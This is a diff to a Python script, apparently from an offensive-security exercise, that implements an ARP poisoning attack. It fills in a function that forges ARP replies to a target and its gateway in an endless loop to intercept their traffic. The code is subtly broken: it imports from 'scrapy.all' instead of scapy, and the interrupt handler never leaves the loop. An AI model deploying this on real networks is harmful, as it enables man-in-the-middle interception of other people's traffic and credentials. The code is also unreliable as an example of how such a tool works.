@@ -3,6 +3,7 @@
 import os
 import sys
 import threading
+import time
 import signal
 from scrapy.all import conf, sniff, wrpcap, ARP, send, srp, Ether
 
@@ -36,11 +37,33 @@ def get_mac(ip_address):
                                 timeout=2, retry=10)
     for s, r in responses:
         return r[Ether].src
-    return None
+    return
 
 
 def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
-    pass
+    poison_target = ARP()
+    poison_target.op = 2
+    poison_target.psrc = gateway_ip
+    poison_target.pdst = target_ip
+    poison_target.hwdst = target_mac
+
+    poison_gateway = ARP()
+    poison_gateway.op = 2
+    poison_gateway.psrc = target_ip
+    poison_gateway.pdst = gateway_ip
+    poison_gateway.hwdst = gateway_mac
+
+    print '[*] Beginning the ARP poison.'
+
+    while True:
+        try:
+            send(poison_target)
+            send(poison_gateway)
+            time.sleep(2)
+        except KeyboardInterrupt:
+            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
+    print '[*] ARP poison attack finished.'
+    return
 
 
 gateway_mac = get_mac(gateway_ip)
